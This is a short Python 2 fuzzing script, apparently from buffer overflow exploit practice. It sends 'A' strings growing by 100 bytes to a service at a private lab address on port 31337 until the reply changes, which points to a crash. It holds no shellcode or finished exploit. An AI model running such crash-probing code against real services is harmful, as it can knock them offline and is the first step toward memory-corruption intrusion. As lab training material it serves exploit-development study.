import socket
import time
ip="192.168.11.130"
port=31337

buffer = ["A"]
count=100

while len(buffer) <= 100:
    buffer.append("A"*count)
    count+=100

for payload in buffer:
    print "Sending %s bytes payload"%len(payload)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(payload)
    s.send("\n")
    data = s.recv(1024)
    if "lo" not in data:
        break
